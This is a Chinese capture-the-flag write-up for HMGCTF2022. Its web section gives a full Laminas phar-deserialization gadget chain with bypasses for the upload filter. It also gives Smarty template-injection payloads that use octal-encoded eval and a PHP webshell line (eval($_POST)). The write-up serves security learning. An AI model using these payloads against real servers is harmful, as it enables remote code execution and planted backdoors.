# [HMGCTF2022] WP


# WEB
## Fan website
首先是一个www.zip的源码泄露，是laminas框架
mvc的框架首先就是看路由
在\module\Album\src\Controller\AlbumController.php里面有功能点

![在这里插入图片描述](https://img-blog.csdnimg.cn/e2af03750a2f41c1b75bb7537874cd72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)

```php
<?php
namespace Album\Controller;

use Album\Model\AlbumTable;
use Laminas\Mvc\Controller\AbstractActionController;
use Laminas\View\Model\ViewModel;
use Album\Form\AlbumForm;
use Album\Form\UploadForm;
use Album\Model\Album;

class AlbumController extends AbstractActionController
{
    // Add this property:
    private $table;
    private $white_list;

    public function __construct(AlbumTable $table){
        $this->table = $table;
        $this->white_list = array('.jpg','.jpeg','.png');
    }

    public function indexAction()
    {
        return new ViewModel([
            'albums' => $this->table->fetchAll(),
        ]);
    }

    public function addAction()
    {
        $form = new AlbumForm();
        $form->get('submit')->setValue('Add');

        $request = $this->getRequest();

        if (! $request->isPost()) {
            return ['form' => $form];
        }

        $album = new Album();
        $form->setInputFilter($album->getInputFilter());
        $form->setData($request->getPost());

        if (! $form->isValid()) {
            return ['form' => $form];
        }

        $album->exchangeArray($form->getData());
        $this->table->saveAlbum($album);
        return $this->redirect()->toRoute('album');
    }


    public function editAction()
    {
        $id = (int) $this->params()->fromRoute('id', 0);

        if (0 === $id) {
            return $this->redirect()->toRoute('album', ['action' => 'add']);
        }

        // Retrieve the album with the specified id. Doing so raises
        // an exception if the album is not found, which should result
        // in redirecting to the landing page.
        try {
            $album = $this->table->getAlbum($id);
        } catch (\Exception $e) {
            return $this->redirect()->toRoute('album', ['action' => 'index']);
        }

        $form = new AlbumForm();
        $form->bind($album);
        $form->get('submit')->setAttribute('value', 'Edit');

        $request = $this->getRequest();
        $viewData = ['id' => $id, 'form' => $form];

        if (! $request->isPost()) {
            return $viewData;
        }

        $form->setInputFilter($album->getInputFilter());
        $form->setData($request->getPost());

        if (! $form->isValid()) {
            return $viewData;
        }

        $this->table->saveAlbum($album);

        // Redirect to album list
        return $this->redirect()->toRoute('album', ['action' => 'index']);
    }


    public function deleteAction()
    {
        $id = (int) $this->params()->fromRoute('id', 0);
        if (!$id) {
            return $this->redirect()->toRoute('album');
        }

        $request = $this->getRequest();
        if ($request->isPost()) {
            $del = $request->getPost('del', 'No');

            if ($del == 'Yes') {
                $id = (int) $request->getPost('id');
                $this->table->deleteAlbum($id);
            }

            // Redirect to list of albums
            return $this->redirect()->toRoute('album');
        }

        return [
            'id'    => $id,
            'album' => $this->table->getAlbum($id),
        ];
    }


    public function imgdeleteAction()
    {
        $request = $this->getRequest();
        if(isset($request->getPost()['imgpath'])){
            $imgpath = $request->getPost()['imgpath'];
            $base = substr($imgpath,-4,4);
            if(in_array($base,$this->white_list)){     //白名单
                @unlink($imgpath);
            }else{
                echo 'Only Img File Can Be Deleted!';
            }
        }
    }
    public function imguploadAction()
    {
        $form = new UploadForm('upload-form');

        $request = $this->getRequest();
        if ($request->isPost()) {
            // Make certain to merge the $_FILES info!
            $post = array_merge_recursive(
                $request->getPost()->toArray(),
                $request->getFiles()->toArray()
            );

            $form->setData($post);
            if ($form->isValid()) {
                $data = $form->getData();
                $base = substr($data["image-file"]["name"],-4,4);
                if(in_array($base,$this->white_list)){   //白名单限制
                    $cont = file_get_contents($data["image-file"]["tmp_name"]);
                    if (preg_match("/<\?|php|HALT\_COMPILER/i", $cont )) {
                        die("Not This");
                    }
                    if($data["image-file"]["size"]<3000){
                        die("The picture size must be more than 3kb");
                    }
                    $img_path = realpath(getcwd()).'/public/img/'.md5($data["image-file"]["name"]).$base;
                    echo $img_path;
                    $form->saveImg($data["image-file"]["tmp_name"],$img_path);
                }else{
                    echo 'Only Img Can Be Uploaded!';
                }
                // Form is valid, save the form!
                //return $this->redirect()->toRoute('upload-form/success');
            }
        }

        return ['form' => $form];
    }

}

```
首先是很明显是一个文件上传

```php
public function imguploadAction()
    {
        $form = new UploadForm('upload-form');

        $request = $this->getRequest();
        if ($request->isPost()) {
            // Make certain to merge the $_FILES info!
            $post = array_merge_recursive(
                $request->getPost()->toArray(),
                $request->getFiles()->toArray()
            );

            $form->setData($post);
            if ($form->isValid()) {
                $data = $form->getData();
                $base = substr($data["image-file"]["name"],-4,4);
                if(in_array($base,$this->white_list)){   //白名单限制
                    $cont = file_get_contents($data["image-file"]["tmp_name"]);
                    if (preg_match("/<\?|php|HALT\_COMPILER/i", $cont )) {
                        die("Not This");
                    }
                    if($data["image-file"]["size"]<3000){
                        die("The picture size must be more than 3kb");
                    }
                    $img_path = realpath(getcwd()).'/public/img/'.md5($data["image-file"]["name"]).$base;
                    echo $img_path;
                    $form->saveImg($data["image-file"]["tmp_name"],$img_path);
                }else{
                    echo 'Only Img Can Be Uploaded!';
                }
                // Form is valid, save the form!
                //return $this->redirect()->toRoute('upload-form/success');
            }
        }

        return ['form' => $form];
    }
```
首先有一个白名单限制，只能传图片后缀，再者这里有一个phar文件的识别
这里就属于此地无银三百两了
```php
("/<\?|php|HALT\_COMPILER/i",
```
找phar的利用点，在imgdeleteAction里面有`@unlink($imgpath);`，可以触发phar

```php
public function imgdeleteAction()
{
    $request = $this->getRequest();
    if(isset($request->getPost()['imgpath'])){
        $imgpath = $request->getPost()['imgpath'];
        $base = substr($imgpath,-4,4);
        if(in_array($base,$this->white_list)){     //白名单
            @unlink($imgpath);
        }else{
            echo 'Only Img File Can Be Deleted!';
        }
    }
}
```
那么就好做了，首先去找链子
如下链子可以rce，直接构造phar文件
```php
<?php

namespace Laminas\View\Resolver{
	class TemplateMapResolver{
		protected $map = ["setBody"=>"system"];
	}
}
namespace Laminas\View\Renderer{
	class PhpRenderer{
		private $__helpers;
		function __construct(){
			$this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
		}
	}
}


namespace Laminas\Log\Writer{
	abstract class AbstractWriter{}
	
	class Mail extends AbstractWriter{
		protected $eventsToMail = ["cat /flag"];
		protected $subjectPrependText = null;
		protected $mail;
		function __construct(){
			$this->mail = new \Laminas\View\Renderer\PhpRenderer();
		}
	}
}

namespace Laminas\Log{
	class Logger{
		protected $writers;
		function __construct(){
			$this->writers = [new \Laminas\Log\Writer\Mail()];
		}
	}
}

namespace{
$a = new \Laminas\Log\Logger();
@unlink("phar.phar");
$phar = new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); 
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();
}
```
由于他会对phar文件的特征进行识别，所以我们需要加以绕过，[这里](https://www.freebuf.com/articles/web/291992.html)有两个绕过方法，我直接把phar文件进行gzip压缩，这样就没有特征了

![在这里插入图片描述](https://img-blog.csdnimg.cn/9278ffc1187f4ded8db45e56c4d1b661.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

然后修改后缀为png，在/album/imgupload里上传上去

他说文件太小，必须要大于3kb
```php
if($data["image-file"]["size"]<3000){
    die("The picture size must be more than 3kb");
}
```
那么就直接在后面加数据就可以了

![在这里插入图片描述](https://img-blog.csdnimg.cn/5d6389c47da648958bc2674a5bb65e55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)

然后上传上去，返回图片的路径

![在这里插入图片描述](https://img-blog.csdnimg.cn/9375049d10694def9ef31341709b42bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

在到/album/imgdelete里面用unlink去触发phar

![在这里插入图片描述](https://img-blog.csdnimg.cn/b56d2a0314764ea2820a113a5f4a3370.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

成功拿到flag

## Smarty calculator
也是开局有一个www.zip的源码泄露，是Smarty模板引擎，看了一下版本是3.1.39

![在这里插入图片描述](https://img-blog.csdnimg.cn/a94f391f7a7546f7b21600a82473403e.png)

那么他说自己修改了这个模板，那么我们下载到源文件去比较一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/e158d7bd4f6449658a1a999a8b2615ad.png)

重点在这个文件：smarty_internal_compile_function.php
他修改了正则过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/3bac3ec643eb4cdfa1e9f64561a4f43f.png)

再看漏洞，网上搜了一轮，在3.1.38有一个代码注入漏洞，CVE-2021-26119和CVE-2021-26120国外有师傅分析过这个[漏洞](https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html)

很明显我们应该就是得走这个方向
我对比了一下38和39的文件的修改，他的修改就是在这个文件里增加了一个正则过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/c4b101e50064480a99cb294fd1d199ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

在我的测试下，这个payload是可以在3.1.38下打通的

```php
{function+name='rce(){};system("id");function+'}{/function}
```
打断点发现这个过滤的确会拦截，所以不能直接在3.1.39打通

```php
preg_match('/[a-zA-Z0-9_\x80-\xff](.*)+$/', $_name)
```
赛后复现，发现可以从math这里入手

![在这里插入图片描述](https://img-blog.csdnimg.cn/78ca368e6db24c94a7d7842379b911f0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

在function_math.php里面，有eval可以执行命令，但是这里有一个过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/ac8b80e8ec5248a1942d64939e6245f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这个过滤如果没过去，那么就会进入到error出去

![在这里插入图片描述](https://img-blog.csdnimg.cn/285deff6b37445dba13880b3bcf3b973.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这个可以用八进制去绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/cae23279f4f94e7c86badf2ee6890682.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

可以看到生成了模板缓存文件，将执行的命令结果输出

![在这里插入图片描述](https://img-blog.csdnimg.cn/beead5595ff94a2eb13ae7ddc02cd40a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

payload：

```php
data={$poc="poc"}{math equation="(\"\\163\\171\\163\\164\\145\\155\")(\"\\167\\150\\157\\141\\155\\151\")"}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/dfa857bb91e74c638e595dcba3d9d92d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

拿flag写个马就行了

```php
file_put_contents("1.php","<?php eval($_POST['a']);?>")
```

转一下得到
```php
eval:{$poc="poc"}{math equation="(\"\\146\\151\\154\\145\\137\\160\\165\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\")(\"\\31\\2e\\70\\68\\70\",\"\\74\\77\\160\\150\\160\\40\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\141\\47\\135\\51\\73\\77\\76\")"}
```

但是这个就很奇怪，这样执行命令的话就不会经过他所修改的正则的方法里面，这是算一个非预期解吗

# Misc
## MissingFile
直接文本搜索都有flag了

![在这里插入图片描述](https://img-blog.csdnimg.cn/1e4d0cfa4aa74c1ea7d15de9e26dc556.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
## 重要系统（复现）
有键盘流量

![在这里插入图片描述](https://img-blog.csdnimg.cn/0fd9beb4befd4a9482183b60c6149128.png)

连接上ssh后，不需要提权能直接grep到flag。。。



